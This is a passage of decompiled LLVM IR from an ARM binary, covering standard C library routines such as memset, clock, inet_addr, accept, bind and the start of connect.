  %v3_13430 = load i32, i32* %v2_13430, align 4
  store i32 %v3_13430, i32* %r2.global-to-local, align 4
  %v4_13434 = call i32 @__getdents(i32 %v2_13428, i32 %v3_1342c, i32 %v3_13430, i32 %v6_1341c)
  %tmp9 = icmp slt i32 %v4_13434, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_13444

.thread:                                          ; preds = %dec_label_pc_13428
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_13478

dec_label_pc_13444:                               ; preds = %dec_label_pc_13428
  %v1_13444 = load i32, i32* @r5, align 4
  %v2_13444 = add i32 %v1_13444, 8
  %v3_13444 = inttoptr i32 %v2_13444 to i32*
  store i32 %v4_13434, i32* %v3_13444, align 4
  %v0_13448 = load i32, i32* @r7, align 4
  %v1_13448 = load i32, i32* @r5, align 4
  %v2_13448 = add i32 %v1_13448, 4
  %v3_13448 = inttoptr i32 %v2_13448 to i32*
  store i32 %v0_13448, i32* %v3_13448, align 4
  %v0_1344c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1344c

dec_label_pc_1344c:                               ; preds = %dec_label_pc_1341c, %dec_label_pc_13444
  %v1_1345c = phi i32 [ %v0_1341c, %dec_label_pc_1341c ], [ %v0_1344c.pre, %dec_label_pc_13444 ]
  %v1_1344c = add i32 %v1_1345c, 4
  %v2_1344c = inttoptr i32 %v1_1344c to i32*
  %v3_1344c = load i32, i32* %v2_1344c, align 4
  store i32 %v3_1344c, i32* %r2.global-to-local, align 4
  %v1_13450 = add i32 %v1_1345c, 12
  %v2_13450 = inttoptr i32 %v1_13450 to i32*
  %v3_13450 = load i32, i32* %v2_13450, align 4
  store i32 %v3_13450, i32* %r1.global-to-local, align 4
  %v2_13454 = add i32 %v3_13450, %v3_1344c
  store i32 %v2_13454, i32* @r4, align 4
  %v1_13458 = add i32 %v2_13454, 4
  %v2_13458 = inttoptr i32 %v1_13458 to i32*
  %v3_13458 = load i32, i32* %v2_13458, align 4
  %v2_1345c = add i32 %v1_1345c, 16
  %v3_1345c = inttoptr i32 %v2_1345c to i32*
  store i32 %v3_13458, i32* %v3_1345c, align 4
  %v0_13460 = load i32, i32* @r4, align 4
  %v1_13460 = add i32 %v0_13460, 8
  %v2_13460 = inttoptr i32 %v1_13460 to i16*
  %v3_13460 = load i16, i16* %v2_13460, align 2
  %v4_13460 = zext i16 %v3_13460 to i32
  %v0_13464 = load i32, i32* %r2.global-to-local, align 4
  %v1_13464 = load i32, i32* %r1.global-to-local, align 4
  %v2_13464 = add i32 %v1_13464, %v0_13464
  %v3_13464 = inttoptr i32 %v2_13464 to i32*
  %v4_13464 = load i32, i32* %v3_13464, align 4
  store i32 %v4_13464, i32* %r1.global-to-local, align 4
  %v2_13468 = add i32 %v0_13464, %v4_13460
  %v2_1346c = icmp eq i32 %v4_13464, 0
  %v1_13470 = load i32, i32* @r5, align 4
  %v2_13470 = add i32 %v1_13470, 4
  %v3_13470 = inttoptr i32 %v2_13470 to i32*
  store i32 %v2_13468, i32* %v3_13470, align 4
  br i1 %v2_1346c, label %dec_label_pc_1341c, label %dec_label_pc_13478

dec_label_pc_13478:                               ; preds = %dec_label_pc_1344c, %.thread
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_13484 = load i32, i32* @r6, align 4
  %v2_13484 = add i32 %v0_13484, 44
  %v3_13484 = inttoptr i32 %v2_13484 to i32*
  %v4_13484 = load i32, i32* %v3_13484, align 4
  call void @__pseudo_branch(i32 %v4_13484)
  %v0_13490 = load i32, i32* @r4, align 4
  store i32 %v3_133cc, i32* @r4, align 4
  store i32 %v6_133cc, i32* @r5, align 4
  store i32 %v9_133cc, i32* @r6, align 4
  store i32 %v12_133cc, i32* @r7, align 4
  store i32 %v15_133cc, i32* @lr, align 4
  ret i32 %v0_13490

; uselistorder directives
  uselistorder i32 %v1_1345c, { 0, 2, 1 }
  uselistorder i32 %v6_1341c, { 1, 0 }
  uselistorder i32 %v0_1341c, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_1344c, { 1, 0 }
}

define i32 @function_134a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_134a4:
  %v0_134a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_134a4, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_134a4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_134a4, %bb
  %v4_134b0 = phi i32 [ %arg1, %dec_label_pc_134a4 ], [ 0, %bb ]
  ret i32 %v4_134b0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  %v0_134b4 = load i32, i32* @lr, align 4
  %v0_134bc = call i32 @__aeabi_read_tp()
  %v3_134c0 = load i16, i16* @global_var_24150.533, align 2
  %v4_134c0 = sext i16 %v3_134c0 to i32
  %v2_134c4 = add i32 %v4_134c0, %v0_134bc
  store i32 %v0_134b4, i32* @lr, align 4
  ret i32 %v2_134c4
}

define i32 @clock(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v2_134d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_134d8, i32* @r0, align 4
  %v1_134e0 = call i32 @times(i32 %v2_134d8)
  %v2_134e4 = load i32, i32* %stack_var_-24, align 4
  %v2_134e8 = add i32 %v2_134e4, %tmp
  %v2_134f0 = mul i32 %v2_134e8, 10000
  %v1_134f4 = and i32 %v2_134f0, 2147483632
  ret i32 %v1_134f4

; uselistorder directives
  uselistorder i32 %v2_134d8, { 1, 0 }
}

define i32 @"$d.10"(i32 %arg1) local_unnamed_addr {
dec_label_pc_13504:
  %v0_13504 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13504, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_13504
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_13504, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_13510 = call i32 @_memcpy()
  ret i32 %v0_13510
}

define i32 @memmove(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_13520 = call i32 @_memcpy()
  ret i32 %v0_13520

; uselistorder directives
  uselistorder i32 ()* @_memcpy, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %v8_13534 = icmp eq i32 %arg3, 8
  store i1 %v8_13534, i1* %cpsr_z.global-to-local, align 1
  %v5_13538 = icmp slt i32 %arg3, 8
  br i1 %v5_13538, label %dec_label_pc_13598, label %dec_label_pc_1353c

dec_label_pc_1353c:                               ; preds = %entry
  %v4_1353c = mul i32 %arg2, 256
  %v5_1353c = or i32 %v4_1353c, %arg2
  %v4_13540 = mul i32 %v5_1353c, 65536
  %v5_13540 = or i32 %v4_13540, %v5_1353c
  store i32 %v5_13540, i32* %r1.global-to-local, align 4
  %v1_1354457 = urem i32 %tmp, 4
  %v2_1354458 = icmp eq i32 %v1_1354457, 0
  store i1 %v2_1354458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1354458, label %dec_label_pc_13554, label %bb

bb:                                               ; preds = %dec_label_pc_1353c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1353c ]
  %v3_1354859 = phi i32 [ %v6_13548, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1353c ]
  %v4_13548 = inttoptr i32 %v3_1354859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13548, align 1
  %v5_13548 = load i32, i32* @r3, align 4
  %v6_13548 = add i32 %v5_13548, 1
  store i32 %v6_13548, i32* @r3, align 4
  %v0_1354c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13558.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br i1 %v0_1354c.pr, label %dec_label_pc_13554, label %.thread

.thread:                                          ; preds = %bb
  %v2_1354c = add i32 %v0_13558.pr.pre, -1
  store i32 %v2_1354c, i32* %r2.global-to-local, align 4
  %v1_13544 = urem i32 %v6_13548, 4
  %v2_13544 = icmp eq i32 %v1_13544, 0
  store i1 %v2_13544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13544, label %dec_label_pc_13554, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_13548.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_13548.pre to i8
  br label %bb

dec_label_pc_13554:                               ; preds = %.thread, %bb, %dec_label_pc_1353c
  %v0_1356028 = phi i32 [ %tmp, %dec_label_pc_1353c ], [ %v6_13548, %bb ], [ %v6_13548, %.thread ]
  %v0_13558.pr = phi i32 [ %arg3, %dec_label_pc_1353c ], [ %v0_13558.pr.pre, %bb ], [ %v2_1354c, %.thread ]
  %v0_13554 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13554, i32* %ip.global-to-local, align 4
  %v8_1355810 = icmp eq i32 %v0_13558.pr, 8
  store i1 %v8_1355810, i1* %cpsr_z.global-to-local, align 1
  %v5_1355c11 = icmp slt i32 %v0_13558.pr, 8
  br i1 %v5_1355c11, label %dec_label_pc_13598, label %dec_label_pc_13560.preheader

dec_label_pc_13560.preheader:                     ; preds = %dec_label_pc_13554
  %v1_1356046 = inttoptr i32 %v0_1356028 to i32*
  store i32 %v0_13554, i32* %v1_1356046, align 4
  %v3_1356047 = add i32 %v0_1356028, 4
  %v4_1356048 = inttoptr i32 %v3_1356047 to i32*
  %v5_1356049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1356049, i32* %v4_1356048, align 4
  %v6_1356050 = add i32 %v0_1356028, 8
  store i32 %v6_1356050, i32* @r3, align 4
  %v0_1356451 = load i32, i32* %r2.global-to-local, align 4
  %v1_1356452 = add i32 %v0_1356451, -8
  store i32 %v1_1356452, i32* %r2.global-to-local, align 4
  %v5_1356c53 = icmp slt i32 %v1_1356452, 8
  br i1 %v5_1356c53, label %dec_label_pc_13560.dec_label_pc_13598.loopexit_crit_edge, label %dec_label_pc_13570

dec_label_pc_13570:                               ; preds = %dec_label_pc_13560.preheader, %dec_label_pc_13558.dec_label_pc_13560_crit_edge
  %v6_1356055 = phi i32 [ %v6_13560, %dec_label_pc_13558.dec_label_pc_13560_crit_edge ], [ %v6_1356050, %dec_label_pc_13560.preheader ]
  %v0_1356054 = phi i32 [ %v12_1358c, %dec_label_pc_13558.dec_label_pc_13560_crit_edge ], [ %v0_1356028, %dec_label_pc_13560.preheader ]
  %v1_13570 = inttoptr i32 %v6_1356055 to i32*
  %v2_13570 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13570, i32* %v1_13570, align 4
  %v3_13570 = add i32 %v0_1356054, 12
  %v4_13570 = inttoptr i32 %v3_13570 to i32*
  %v5_13570 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13570, i32* %v4_13570, align 4
  %v6_13570 = add i32 %v0_1356054, 16
  store i32 %v6_13570, i32* @r3, align 4
  %v0_13574 = load i32, i32* %r2.global-to-local, align 4
  %v1_13574 = add i32 %v0_13574, -8
  store i32 %v1_13574, i32* %r2.global-to-local, align 4
  %v5_1357c = icmp slt i32 %v1_13574, 8
  br i1 %v5_1357c, label %dec_label_pc_13570.dec_label_pc_13598.loopexit_crit_edge, label %dec_label_pc_13580

dec_label_pc_13580:                               ; preds = %dec_label_pc_13570
  %v1_13580 = inttoptr i32 %v6_13570 to i32*
  %v2_13580 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_13580, i32* %v1_13580, align 4
  %v3_13580 = add i32 %v0_1356054, 20
  %v4_13580 = inttoptr i32 %v3_13580 to i32*
  %v5_13580 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13580, i32* %v4_13580, align 4
  %v6_13580 = add i32 %v0_1356054, 24
  store i32 %v6_13580, i32* @r3, align 4
  %v0_13584 = load i32, i32* %r2.global-to-local, align 4
  %v1_13584 = add i32 %v0_13584, -8
  store i32 %v1_13584, i32* %r2.global-to-local, align 4
  %v5_1358c = icmp slt i32 %v1_13584, 8
  br i1 %v5_1358c, label %dec_label_pc_13580.dec_label_pc_13598.loopexit_crit_edge, label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_13580
  %v7_1358c = inttoptr i32 %v6_13580 to i32*
  %v8_1358c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1358c, i32* %v7_1358c, align 4
  %v9_1358c = add i32 %v0_1356054, 28
  %v10_1358c = inttoptr i32 %v9_1358c to i32*
  %v11_1358c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1358c, i32* %v10_1358c, align 4
  %v12_1358c = add i32 %v0_1356054, 32
  store i32 %v12_1358c, i32* @r3, align 4
  %v6_13590 = load i32, i32* %r2.global-to-local, align 4
  %v7_13590 = add i32 %v6_13590, -8
  store i32 %v7_13590, i32* %r2.global-to-local, align 4
  %v5_1355c = icmp slt i32 %v7_13590, 8
  br i1 %v5_1355c, label %dec_label_pc_13558.dec_label_pc_13598.loopexit_crit_edge, label %dec_label_pc_13558.dec_label_pc_13560_crit_edge

dec_label_pc_13558.dec_label_pc_13560_crit_edge:  ; preds = %dec_label_pc_13558
  %v2_13560.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13560 = inttoptr i32 %v12_1358c to i32*
  store i32 %v2_13560.pre, i32* %v1_13560, align 4
  %v3_13560 = add i32 %v0_1356054, 36
  %v4_13560 = inttoptr i32 %v3_13560 to i32*
  %v5_13560 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_13560, i32* %v4_13560, align 4
  %v6_13560 = add i32 %v0_1356054, 40
  store i32 %v6_13560, i32* @r3, align 4
  %v0_13564 = load i32, i32* %r2.global-to-local, align 4
  %v1_13564 = add i32 %v0_13564, -8
  store i32 %v1_13564, i32* %r2.global-to-local, align 4
  %v5_1356c = icmp slt i32 %v1_13564, 8
  br i1 %v5_1356c, label %dec_label_pc_13560.dec_label_pc_13598.loopexit_crit_edge, label %dec_label_pc_13570

dec_label_pc_13558.dec_label_pc_13598.loopexit_crit_edge: ; preds = %dec_label_pc_13558
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13598

dec_label_pc_13560.dec_label_pc_13598.loopexit_crit_edge: ; preds = %dec_label_pc_13558.dec_label_pc_13560_crit_edge, %dec_label_pc_13560.preheader
  %v1_13564.lcssa = phi i32 [ %v1_1356452, %dec_label_pc_13560.preheader ], [ %v1_13564, %dec_label_pc_13558.dec_label_pc_13560_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13598

dec_label_pc_13570.dec_label_pc_13598.loopexit_crit_edge: ; preds = %dec_label_pc_13570
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13598

dec_label_pc_13580.dec_label_pc_13598.loopexit_crit_edge: ; preds = %dec_label_pc_13580
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13598

dec_label_pc_13598:                               ; preds = %dec_label_pc_13554, %dec_label_pc_13558.dec_label_pc_13598.loopexit_crit_edge, %dec_label_pc_13560.dec_label_pc_13598.loopexit_crit_edge, %dec_label_pc_13570.dec_label_pc_13598.loopexit_crit_edge, %dec_label_pc_13580.dec_label_pc_13598.loopexit_crit_edge, %entry
  %v0_135a0 = phi i32 [ %arg3, %entry ], [ %v1_13584, %dec_label_pc_13580.dec_label_pc_13598.loopexit_crit_edge ], [ %v1_13574, %dec_label_pc_13570.dec_label_pc_13598.loopexit_crit_edge ], [ %v1_13564.lcssa, %dec_label_pc_13560.dec_label_pc_13598.loopexit_crit_edge ], [ %v7_13590, %dec_label_pc_13558.dec_label_pc_13598.loopexit_crit_edge ], [ %v0_13558.pr, %dec_label_pc_13554 ]
  %v2_13598 = icmp eq i32 %v0_135a0, 0
  store i1 %v2_13598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13598, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_13598
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_13598
  %v1_135a0 = sub i32 7, %v0_135a0
  store i32 %v1_135a0, i32* %r2.global-to-local, align 4
  %v3_135a4 = mul i32 %v1_135a0, 4
  %v4_135a4 = add i32 %v3_135a4, ptrtoint (i32* @global_var_135ac.584 to i32)
  call void @__pseudo_branch(i32 %v4_135a4)
  %v0_135ac = load i32, i32* %r1.global-to-local, align 4
  %v1_135ac = trunc i32 %v0_135ac to i8
  %v2_135ac = load i32, i32* @r3, align 4
  %v3_135ac = inttoptr i32 %v2_135ac to i8*
  store i8 %v1_135ac, i8* %v3_135ac, align 1
  %v4_135ac = load i32, i32* @r3, align 4
  %v5_135ac = add i32 %v4_135ac, 1
  store i32 %v5_135ac, i32* %r3.global-to-local, align 4
  %v0_135b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_135b0 = trunc i32 %v0_135b0 to i8
  %v3_135b0 = inttoptr i32 %v5_135ac to i8*
  store i8 %v1_135b0, i8* %v3_135b0, align 1
  %v4_135b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_135b0 = add i32 %v4_135b0, 1
  store i32 %v5_135b0, i32* %r3.global-to-local, align 4
  %v0_135b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_135b4 = trunc i32 %v0_135b4 to i8
  %v3_135b4 = inttoptr i32 %v5_135b0 to i8*
  store i8 %v1_135b4, i8* %v3_135b4, align 1
  %v4_135b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_135b4 = add i32 %v4_135b4, 1
  store i32 %v5_135b4, i32* %r3.global-to-local, align 4
  %v0_135b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_135b8 = trunc i32 %v0_135b8 to i8
  %v3_135b8 = inttoptr i32 %v5_135b4 to i8*
  store i8 %v1_135b8, i8* %v3_135b8, align 1
  %v4_135b8 = load i32, i32* %r3.global-to-local, align 4
  %v5_135b8 = add i32 %v4_135b8, 1
  store i32 %v5_135b8, i32* %r3.global-to-local, align 4
  %v0_135bc = load i32, i32* %r1.global-to-local, align 4
  %v1_135bc = trunc i32 %v0_135bc to i8
  %v3_135bc = inttoptr i32 %v5_135b8 to i8*
  store i8 %v1_135bc, i8* %v3_135bc, align 1
  %v4_135bc = load i32, i32* %r3.global-to-local, align 4
  %v5_135bc = add i32 %v4_135bc, 1
  store i32 %v5_135bc, i32* %r3.global-to-local, align 4
  %v0_135c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_135c0 = trunc i32 %v0_135c0 to i8
  %v3_135c0 = inttoptr i32 %v5_135bc to i8*
  store i8 %v1_135c0, i8* %v3_135c0, align 1
  %v4_135c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_135c0 = add i32 %v4_135c0, 1
  store i32 %v5_135c0, i32* %r3.global-to-local, align 4
  %v0_135c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_135c4 = trunc i32 %v0_135c4 to i8
  %v3_135c4 = inttoptr i32 %v5_135c0 to i8*
  store i8 %v1_135c4, i8* %v3_135c4, align 1
  %v4_135c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_135c4 = add i32 %v4_135c4, 1
  store i32 %v5_135c4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_13560, { 1, 0 }
  uselistorder i32 %v12_1358c, { 1, 2, 0 }
  uselistorder i32 %v0_1356054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_13558.pr, { 0, 2, 1 }
  uselistorder i32 %v6_13548, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1353c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 10, 3, 4, 5, 6, 7, 8, 9, 1, 11, 13, 12, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 2, 1, 0, 3, 4, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13598, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_13570, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_135d8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_135d8, i32* @r1, align 4
  %v0_135dc = call i32 @inet_aton()
  %v2_135e0 = icmp eq i32 %v0_135dc, 0
  %v4_135e4 = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_135e0, i32 -1, i32 %v4_135e4
  ret i32 %storemerge
}

define i32 @__sys_accept() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_135f8 = load i32, i32* @r7, align 4
  store i32 %v3_135f8, i32* %stack_var_-8, align 4
  %v0_13604 = load i32, i32* @r0, align 4
  store i32 %v0_13604, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13604, -4095
  br i1 %tmp, label %dec_label_pc_1362c, label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %entry
  %v0_13618 = call i32 @__aeabi_read_tp()
  %v3_1361c = load i16, i16* @global_var_24150.533, align 2
  %v4_1361c = sext i16 %v3_1361c to i32
  %v0_13620 = load i32, i32* %r2.global-to-local, align 4
  %v1_13620 = sub i32 0, %v0_13620
  store i32 %v1_13620, i32* %r2.global-to-local, align 4
  %v3_13624 = add i32 %v4_1361c, %v0_13618
  %v4_13624 = inttoptr i32 %v3_13624 to i32*
  store i32 %v1_13620, i32* %v4_13624, align 4
  %v2_1362c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1362c

dec_label_pc_1362c:                               ; preds = %entry, %dec_label_pc_13614
  %v1_13630 = phi i32 [ %v0_13604, %entry ], [ -1, %dec_label_pc_13614 ]
  %v2_1362c = phi i32 [ %v3_135f8, %entry ], [ %v2_1362c.pre, %dec_label_pc_13614 ]
  store i32 %v2_1362c, i32* @r7, align 4
  ret i32 %v1_13630

; uselistorder directives
  uselistorder i32 %v0_13604, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1362c, { 1, 0 }
}

define i32 @"$d.9"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13634:
  %v0_13634 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13634, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13634
  %v2_13638 = load i32, i32* @ip, align 4
  %v5_13638 = udiv i32 %v2_13638, 4194304
  %v6_13638 = and i32 %v5_13638, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13634, %bb
  %v7_13638 = phi i32 [ %arg1, %dec_label_pc_13634 ], [ %v6_13638, %bb ]
  ret i32 %v7_13638

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13640 = load i32, i32* @r4, align 4
  store i32 %v3_13640, i32* %stack_var_-20, align 4
  %v6_13640 = load i32, i32* @r5, align 4
  %v9_13640 = load i32, i32* @r6, align 4
  %v12_13640 = load i32, i32* @r7, align 4
  %v4_1364c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 12972) to i32*), align 4
  %v2_13650 = icmp eq i32 %v4_1364c, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  br i1 %v2_13650, label %dec_label_pc_13668, label %entry.dec_label_pc_13674_crit_edge

entry.dec_label_pc_13674_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13674

dec_label_pc_13668:                               ; preds = %entry
  store i32 %v3_13640, i32* @r4, align 4
  store i32 %v9_13640, i32* @r6, align 4
  store i32 %v12_13640, i32* @r7, align 4
  %v0_13670 = call i32 @__sys_accept()
  br label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %entry.dec_label_pc_13674_crit_edge, %dec_label_pc_13668
  %v0_13674 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13674, i32* @r5, align 4
  %v0_13684 = load i32, i32* @r4, align 4
  store i32 %v0_13684, i32* @r0, align 4
  %v0_13688 = call i32 @__sys_accept()
  store i32 %v0_13688, i32* @r4, align 4
  %v0_13690 = load i32, i32* @r5, align 4
  %v1_13694 = call i32 @__libc_disable_asynccancel(i32 %v0_13690)
  %v0_13698 = load i32, i32* @r4, align 4
  %v2_136a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_136a0, i32* @r4, align 4
  store i32 %v6_13640, i32* @r5, align 4
  store i32 %v9_13640, i32* @r6, align 4
  store i32 %v12_13640, i32* @r7, align 4
  ret i32 %v0_13698

; uselistorder directives
  uselistorder label %dec_label_pc_13674, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136b0 = load i32, i32* @r7, align 4
  store i32 %v3_136b0, i32* %stack_var_-8, align 4
  %v0_136bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_136bc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_136bc, -4095
  br i1 %tmp, label %dec_label_pc_136e4, label %dec_label_pc_136cc

dec_label_pc_136cc:                               ; preds = %entry
  %v0_136d0 = call i32 @__aeabi_read_tp()
  %v3_136d4 = load i16, i16* @global_var_24150.533, align 2
  %v4_136d4 = sext i16 %v3_136d4 to i32
  %v0_136d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_136d8 = sub i32 0, %v0_136d8
  store i32 %v1_136d8, i32* %r2.global-to-local, align 4
  %v3_136dc = add i32 %v4_136d4, %v0_136d0
  %v4_136dc = inttoptr i32 %v3_136dc to i32*
  store i32 %v1_136d8, i32* %v4_136dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_136e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %entry, %dec_label_pc_136cc
  %v1_136e8 = phi i32 [ %v0_136bc, %entry ], [ -1, %dec_label_pc_136cc ]
  %v2_136e4 = phi i32 [ %v3_136b0, %entry ], [ %v2_136e4.pre, %dec_label_pc_136cc ]
  store i32 %v2_136e4, i32* @r7, align 4
  ret i32 %v1_136e8

; uselistorder directives
  uselistorder i32 %v0_136bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_136e4, { 1, 0 }
}

define i32 @"$d.8"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_136ec:
  %v0_136ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_136ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_136ec
  %v2_136ec = load i32, i32* @sl, align 4
  %v2_136f0 = load i32, i32* @r4, align 4
  %v4_136f0 = lshr i32 %v2_136f0, %v2_136ec
  %v5_136f0 = sub i32 32, %v2_136ec
  %v6_136f0 = shl i32 %v2_136f0, %v5_136f0
  %v7_136f0 = or i32 %v6_136f0, %v4_136f0
  %v9_136f0 = and i32 %v7_136f0, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_136ec, %bb
  %v10_136f0 = phi i32 [ %arg1, %dec_label_pc_136ec ], [ %v9_136f0, %bb ]
  ret i32 %v10_136f0

; uselistorder directives
  uselistorder i32 %v2_136ec, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__sys_connect() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_136f4 = load i32, i32* @r7, align 4
  store i32 %v3_136f4, i32* %stack_var_-8, align 4
  %v0_13700 = load i32, i32* @r0, align 4
  store i32 %v0_13700, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13700, -4095
  br i1 %tmp, label %dec_label_pc_13728, label %dec_label_pc_13710

dec_label_pc_13710:                               ; preds = %entry
  %v0_13714 = call i32 @__aeabi_read_tp()
  %v3_13718 = load i16, i16* @global_var_24150.533, align 2
  %v4_13718 = sext i16 %v3_13718 to i32
  store i32 %v4_13718, i32* @r3, align 4
  %v0_1371c = load i32, i32* %r2.global-to-local, align 4
  %v1_1371c = sub i32 0, %v0_1371c
  store i32 %v1_1371c, i32* %r2.global-to-local, align 4
  %v3_13720 = add i32 %v4_13718, %v0_13714
